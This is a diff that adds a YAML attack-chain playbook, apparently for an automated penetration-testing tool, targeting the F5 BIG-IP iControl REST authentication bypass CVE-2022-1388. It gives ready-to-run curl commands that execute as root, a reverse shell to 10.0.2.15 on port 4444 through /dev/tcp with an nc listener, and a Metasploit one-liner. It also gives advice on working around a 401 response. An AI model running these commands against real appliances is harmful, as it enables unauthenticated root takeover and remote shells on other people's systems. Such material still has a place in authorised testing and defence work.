@@ -1,0 +1,56 @@
+chain_id: f5_bigip_cve_2022_1388
+title: "F5 BIG-IP — CVE-2022-1388 iControl REST auth bypass → unauth RCE"
+severity: CRITICAL
+tags: [web, f5, bigip, cve-2022-1388, auth-bypass, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2022-1388" }
+    - { banner_pattern: "(?i)bigip|big-?ip|f5\\s*networks" }
+    - { product_pattern: "(?i)f5\\s*big-?ip" }
+    - { path_pattern: "(?i)/mgmt/tm/util/bash" }
+
+description: |
+  F5 BIG-IP 16.1.0–16.1.2, 15.1.0–15.1.5, 14.1.0–14.1.4, 13.1.0–13.1.4
+  iControl REST honors `Connection: X-F5-Auth-Token` together with
+  `X-F5-Auth-Token: 0` to short-circuit auth, then accepts a Basic
+  header for `admin` or `root` regardless of the actual password.
+  POST to `/mgmt/tm/util/bash` with `command: run` runs as root.
+
+steps:
+  - id: 1
+    title: "One-shot: id as root"
+    command: |
+      curl -sk -u admin: "https://$VICTIMA/mgmt/tm/util/bash" \
+        -H 'Content-Type: application/json' \
+        -H 'X-F5-Auth-Token: 0' \
+        -H 'Connection: keep-alive, X-F5-Auth-Token' \
+        -d '{"command":"run","utilCmdArgs":"-c id"}'
+
+  - id: 2
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      curl -sk -u admin: "https://$VICTIMA/mgmt/tm/util/bash" \
+        -H 'Content-Type: application/json' \
+        -H 'X-F5-Auth-Token: 0' \
+        -H 'Connection: keep-alive, X-F5-Auth-Token' \
+        -d '{"command":"run","utilCmdArgs":"-c \"bash -i >& /dev/tcp/10.0.2.15/4444 0>&1\""}'
+
+  - id: 3
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/linux/http/f5_icontrol_rest_rce_cve_2022_1388; \
+        set RHOSTS $VICTIMA; set RPORT 443; set SSL true; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+common_errors:
+  - error: "401 Unauthorized"
+    solution: |
+      The patch (≥17.0.0, 16.1.2.2, 15.1.5.1, 14.1.4.6, 13.1.5) blocks
+      this. Try `bash` user instead of `admin`, or fall back to
+      authenticated CVEs once you have creds.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-1388
+  - https://my.f5.com/manage/s/article/K23605346
